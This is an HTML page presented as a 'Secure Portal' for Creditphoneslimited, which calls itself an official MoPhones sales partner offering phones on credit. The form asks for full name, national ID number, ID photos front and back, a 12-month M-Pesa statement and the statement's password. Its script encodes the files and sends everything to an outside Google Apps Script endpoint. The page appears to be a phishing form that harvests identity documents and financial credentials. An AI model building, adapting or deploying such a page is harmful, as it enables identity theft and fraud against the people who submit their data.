<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MoPhones | Secure Portal</title>
    <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '852047494123267');
    fbq('track', 'PageView');
    </script>
    <style>
        body { font-family: sans-serif; background-color: #0f172a; color: #334155; margin: 0; padding: 10px; }
        .card { background: white; padding: 20px; border-radius: 15px; max-width: 450px; margin: auto; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
        .btn-check { display: block; text-align: center; background: #fdf2f8; color: #be185d; padding: 10px; border: 1px dashed #be185d; border-radius: 10px; text-decoration: none; font-weight: bold; margin-bottom: 15px; font-size: 14px; }
        .banner { background: #fff1f2; border: 1px solid #dc2626; color: #dc2626; padding: 10px; border-radius: 8px; font-size: 12px; text-align: center; margin-bottom: 15px; }
        .tip { background: #f0f9ff; border-left: 4px solid #004488; padding: 8px; font-size: 12px; margin-bottom: 10px; }
        label { display: block; margin-top: 12px; font-weight: bold; font-size: 13px; }
        input, select { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
        .btn-sub { background: #004488; color: white; padding: 15px; border: none; border-radius: 8px; width: 100%; margin-top: 20px; font-weight: bold; cursor: pointer; }
        .whatsapp { display: flex; align-items: center; justify-content: center; background: #25d366; color: white; padding: 12px; border-radius: 8px; text-decoration: none; margin-top: 10px; font-weight: bold; }
    </style>
</head>
<body>
<div class="card">
    <div style="text-align:center; margin-bottom:15px;">
        <h2 style="color:#004488; margin:0;">Creditphoneslimited</h2>
        <p style="font-size:12px; color:#64748b; margin:5px 0;">Official MoPhones Sales Partner</p>
    </div>

    <a href="https://mophones.co" class="btn-check">üîç View Samsung & iPhone Prices</a>

    <div class="banner">üö® <b>WARNING:</b> False info leads to <b>Automatic Disqualification</b> during the credit call.</div>

    <form id="portalForm">
        <label>Your Region</label>
        <select name="region" required>
            <option value="">-- Select --</option>
            <option value="nairobi">Nairobi</option>
            <option value="kiambu">Kiambu</option>
            <option value="machakos">Machakos</option>
            <option value="nakuru">Nakuru</option>
            <option value="kajiado">Kajiado Environs</option>
        </select>

        <label>Full Name (As per ID)</label>
        <input type="text" name="full_name" placeholder="Enter 3 names" required>

        <label>ID Number</label>
        <input type="number" name="id_number" required>

        <label>ID Photos (Front & Back)</label>
        <input type="file" name="id_front" accept="image/*" required>
        <input type="file" name="id_back" accept="image/*" style="margin-top:5px;" required>

        <label>M-Pesa Statement (12 Months PDF)</label>
        <div class="tip">üí° <b>Quick Tip:</b> Dial <b>*334#</b> > My Account > M-PESA Statement > Email Statement.</div>
        <input type="file" name="mpesa" accept=".pdf" required>

        <label>Statement Password</label>
        <input type="text" name="pw" required>

        <button type="submit" class="btn-sub" id="subBtn">Submit Application</button>
        
        <a href="https://wa.me/254112384099" class="whatsapp">Chat on WhatsApp</a>
    </form>
</div>

<script>
const scriptURL = 'https://script.google.com/macros/s/AKfycbw2I8rq16apOzIQNmxNNPBfk4TIr4UrUQOOnU2hVTr-a826LSb0ysuGlYXoi8iFA8Cq/exec';
const form = document.getElementById('portalForm');
const btn = document.getElementById('subBtn');

form.addEventListener('submit', e => {
    e.preventDefault();
    btn.disabled = true;
    btn.innerText = "Processing... Wait!";
    
    const formData = {};
    const fileInputs = form.querySelectorAll('input[type="file"]');
    form.querySelectorAll('input:not([type="file"]), select').forEach(i => formData[i.name] = i.value);

    const promises = Array.from(fileInputs).map(i => {
        return new Promise((res) => {
            const f = i.files[0];
            if(!f){res(); return;}
            const r = new FileReader();
            r.onload = (ev) => { formData[i.name] = ev.target.result; res(); };
            r.readAsDataURL(f);
        });
    });

    Promise.all(promises).then(() => {
        fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(formData) })
        .then(() => { 
            alert("SUCCESS! Wait for Lilian's call."); 
            form.reset(); window.location.reload(); 
        })
        .catch(() => { alert("Error. Try again."); btn.disabled = false; });
    });
});
</script>
</body>
</html>
